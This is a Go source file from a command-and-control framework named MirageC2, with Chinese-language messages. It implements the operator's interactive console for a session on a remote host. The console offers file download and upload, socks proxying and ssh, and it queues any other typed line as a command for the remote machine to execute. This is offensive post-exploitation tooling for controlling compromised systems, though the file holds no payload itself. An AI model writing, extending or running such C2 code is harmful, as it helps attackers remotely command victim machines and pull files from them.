package inputbase

import (
	"MirageC2_V1.0/app/exchange"
	"MirageC2_V1.0/app/jobs"
	"MirageC2_V1.0/public/check"
	"MirageC2_V1.0/public/initbase/inputbase/sessionbase"
	"fmt"
	"github.com/chzyer/readline"
	"os"
	"regexp"
	"strconv"
	"strings"
	"time"
)

func Sessions(parts []string) {
	if len(parts) != 2 {
		fmt.Println("[-] 您输入的Session命令存在问题，请仔细检查输入的参数，或使用help命令查看帮助信息！")
		return
	}
	intID, err := strconv.Atoi(parts[1])
	if check.SessionsExistsCheck(intID) == false || err != nil {
		fmt.Println("[-] 输入的Sessions不存在，或者并不处于Active状态。")
		return
	}
	rl, err := readline.New("Mirage Control -> Session" + parts[1] + " > ")
	if err != nil {
		fmt.Println("[-] 读取输入出错:", err)
		os.Exit(1)
	}
	defer rl.Close()

outerLoop:
	for {
		line, err := rl.Readline()
		line = strings.TrimSpace(line)
		re := regexp.MustCompile(`\s+`)
		sess_parts := re.Split(line, -1)
		if err != nil {
			break // 处理 EOF 或其他读取错误ex
		}
		switch sess_parts[0] {
		case "":
			continue
		case "help":
			sessionbase.Help()
			continue
		case "exit":
			fmt.Printf("[*] Sessions %d 将被挂起\n", intID)
			os.Stdout.Sync()
			break outerLoop
		case "show":
			jobs.ShowTasksPool(intID)
			continue
		case "download":
			if len(sess_parts) == 3 {
				go exchange.FileControl("download", sess_parts[2], sess_parts[1], intID)
			} else {
				fmt.Printf("[*] download参数输入错误，例子：download <RemotePath> <LocalPath> \n")
			}
			continue
		case "upload":
			if len(sess_parts) == 3 {
				go exchange.FileControl("upload", sess_parts[1], sess_parts[2], intID)
			} else {
				fmt.Printf("[*] upload参数输入错误，例子：upload <LocalPath> <RemotePath>\n")
			}
			continue
		case "socks":
			sessionbase.Socks(sess_parts, intID)
			continue
		case "ssh":
			sessionbase.SSH(sess_parts, intID)
			continue
		default:
			jobs.TaskPoolAdd(intID, line)
			time.Sleep(10 * time.Millisecond)
			continue
		}
	}
}
